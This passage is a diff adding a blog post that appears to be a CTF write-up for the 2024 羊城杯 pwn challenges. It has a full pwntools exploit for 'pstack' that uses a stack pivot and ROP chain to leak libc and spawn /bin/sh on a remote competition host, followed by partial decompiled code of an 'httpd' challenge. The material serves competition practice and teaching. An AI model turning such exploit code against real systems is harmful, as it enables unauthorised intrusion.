@@ -126,6 +126,305 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/09/04/羊城杯2024pwn/" >羊城杯2024pwn</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-09-04  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn">https://github.com/nyyyddddn/ctf/tree/main/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn</a></p>
+<h2 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h2><p>程序逻辑非常简单，存在栈溢出只能覆盖返回地址，没有pie，通过二次栈迁移，控制rbp来实现任意地址写，然后第一次栈迁移往bss写满泄露地址的rop，之后二次迁移过去执行就可以执行rop，第一次rop泄露地址，第二次rop直接getshell</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+is_debug <span class="token operator">=</span> <span class="token number">0</span>
+IP <span class="token operator">=</span> <span class="token string">"139.155.126.78"</span>
+PORT <span class="token operator">=</span> <span class="token number">32922</span>
+elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+
+p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+rdi<span class="token operator">=</span><span class="token number">0x0000000000400773</span>
+rbp<span class="token operator">=</span><span class="token number">0x00000000004005b0</span>
+leave_ret<span class="token operator">=</span><span class="token number">0x4006DB</span>
+ret<span class="token operator">=</span><span class="token number">0x4006DC</span>
+vuln<span class="token operator">=</span><span class="token number">0x4006C4</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
+    <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x601730</span><span class="token punctuation">,</span>vuln
+<span class="token punctuation">]</span><span class="token punctuation">)</span>
+sa<span class="token punctuation">(</span><span class="token string">"Can you grasp this little bit of overflow?"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
+    rdi<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    rbp<span class="token punctuation">,</span><span class="token number">0x601a30</span><span class="token punctuation">,</span>vuln<span class="token punctuation">,</span>
+    <span class="token number">0x6016f8</span><span class="token punctuation">,</span>leave_ret
+<span class="token punctuation">]</span><span class="token punctuation">)</span>
+s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
+    rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">,</span>
+    <span class="token number">0x6019f8</span><span class="token punctuation">,</span>leave_ret
+<span class="token punctuation">]</span><span class="token punctuation">)</span>
+s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> bad sp value at call has been detected<span class="token punctuation">,</span> the output may be wrong!
+<span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token builtin">int</span> v3<span class="token punctuation">;</span> <span class="token operator">//</span> eax
+  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> eax
+  <span class="token builtin">int</span> result<span class="token punctuation">;</span> <span class="token operator">//</span> eax
+  <span class="token builtin">int</span> v6<span class="token punctuation">;</span> <span class="token operator">//</span> eax
+  <span class="token builtin">int</span> v7<span class="token punctuation">;</span> <span class="token operator">//</span> eax
+  struct tm <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token operator">//</span> eax
+  __time_t tv_sec<span class="token punctuation">;</span> <span class="token operator">//</span> edi
+  <span class="token builtin">int</span> st_size<span class="token punctuation">;</span> <span class="token operator">//</span> esi
+  const char <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token operator">//</span> eax
+  struct dirent <span class="token operator">**</span>namelist<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14134h<span class="token punctuation">]</span> BYREF
+  <span class="token builtin">int</span> v13<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14130h<span class="token punctuation">]</span> BYREF
+  <span class="token builtin">int</span> v14<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1412Ch<span class="token punctuation">]</span> BYREF
+  <span class="token builtin">int</span> v15<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>14h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14128h<span class="token punctuation">]</span> BYREF
+  <span class="token builtin">int</span> v16<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14124h<span class="token punctuation">]</span> BYREF
+  char v17<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14120h<span class="token punctuation">]</span> BYREF
+  char <span class="token operator">*</span>haystack<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1411Ch<span class="token punctuation">]</span>
+  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>24h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14118h<span class="token punctuation">]</span>
+  size_t v20<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>28h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14114h<span class="token punctuation">]</span>
+  char <span class="token operator">*</span>has_host<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14110h<span class="token punctuation">]</span>
+  char <span class="token operator">*</span>v22<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>30h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1410Ch<span class="token punctuation">]</span>
+  <span class="token builtin">int</span> stdout_fd<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>34h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14108h<span class="token punctuation">]</span>
+  <span class="token builtin">int</span> v24<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>38h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14104h<span class="token punctuation">]</span>
+  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>3Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14100h<span class="token punctuation">]</span>
+  <span class="token builtin">int</span> v26<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>40h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140FCh<span class="token punctuation">]</span>
+  FILE <span class="token operator">*</span>v27<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>44h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F8h<span class="token punctuation">]</span>
+  <span class="token builtin">int</span> c<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>48h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F4h<span class="token punctuation">]</span>
+  struct stat v29<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>4Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>140F0h<span class="token punctuation">]</span> BYREF
+  char modes<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A6h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14096h<span class="token punctuation">]</span> BYREF
+  char v31<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14094h<span class="token punctuation">]</span> BYREF
+  char v32<span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>B8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14084h<span class="token punctuation">]</span> BYREF
+  char v33<span class="token punctuation">[</span><span class="token number">1908</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>14010h<span class="token punctuation">]</span> BYREF
+  char input_data<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>8A0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1389Ch<span class="token punctuation">]</span> BYREF
+  char httpMethod<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2FB0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1118Ch<span class="token punctuation">]</span> BYREF
+  char requestPath<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>56C0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>EA7Ch<span class="token punctuation">]</span> BYREF
+  char v37<span class="token punctuation">[</span><span class="token number">9999</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>56C1h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>EA7Bh<span class="token punctuation">]</span> BYREF
+  char httpVersion<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>7DD0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>C36Ch<span class="token punctuation">]</span> BYREF
+  char <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token number">20000</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>A4E0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>9C5Ch<span class="token punctuation">]</span> BYREF
+  char v40<span class="token punctuation">[</span><span class="token number">15588</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>F300h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>4E3Ch<span class="token punctuation">]</span> BYREF
+  __int64 v41<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12FE4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1158h<span class="token punctuation">]</span>
+  char <span class="token operator">*</span>v42<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>12FECh<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1150h<span class="token punctuation">]</span>
+  <span class="token builtin">int</span> v43<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1312Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1010h<span class="token punctuation">]</span> BYREF
+  unsigned <span class="token builtin">int</span> v44<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>14120h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span>
+  <span class="token builtin">int</span> <span class="token operator">*</span>p_argc<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>1412Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>10h<span class="token punctuation">]</span>
+
+  p_argc <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>v43 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>v33 <span class="token punctuation">)</span>
+    <span class="token punctuation">;</span>
+  v44 <span class="token operator">=</span> __readgsdword<span class="token punctuation">(</span>0x14u<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  memset<span class="token punctuation">(</span><span class="token operator">&amp;</span>v33<span class="token punctuation">[</span><span class="token number">884</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v20 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  strcpy<span class="token punctuation">(</span>modes<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> chdir<span class="token punctuation">(</span><span class="token string">"/home/ctf/html"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Internal Error"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Config error - couldn't chdir()."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"No request found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> __isoc99_sscanf<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"%[^ ] %[^ ] %[^ ]"</span><span class="token punctuation">,</span> httpMethod<span class="token punctuation">,</span> <span class="token operator">&amp;</span>requestPath<span class="token punctuation">,</span> httpVersion<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Can't parse request."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Host."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  has_host <span class="token operator">=</span> strstr<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"Host: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> !has_host <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Host."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v22 <span class="token operator">=</span> strstr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    v22 <span class="token operator">=</span> strchr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
+      <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> strlen<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">7</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Host len error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> has_host <span class="token operator">==</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">|</span><span class="token operator">|</span> !has_host<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Host fmt error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v42 <span class="token operator">=</span> <span class="token operator">&amp;</span>v17<span class="token punctuation">;</span>
+  HIDWORD<span class="token punctuation">(</span>v41<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>v16<span class="token punctuation">;</span>
+  __isoc99_sscanf<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">"%d.%d.%d.%d%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v14<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> !fgets<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> stdin<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Content-Length."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  has_host <span class="token operator">=</span> strstr<span class="token punctuation">(</span>input_data<span class="token punctuation">,</span> <span class="token string">"Content-Length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> !has_host <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Missing Content-Length."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v22 <span class="token operator">=</span> strstr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    v22 <span class="token operator">=</span> strchr<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v22 <span class="token punctuation">)</span>
+      <span class="token operator">*</span>v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> strlen<span class="token punctuation">(</span>has_host <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
+    puts_error<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token string">"Bad Request"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Content-Length len too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> strcasecmp<span class="token punctuation">(</span>httpMethod<span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
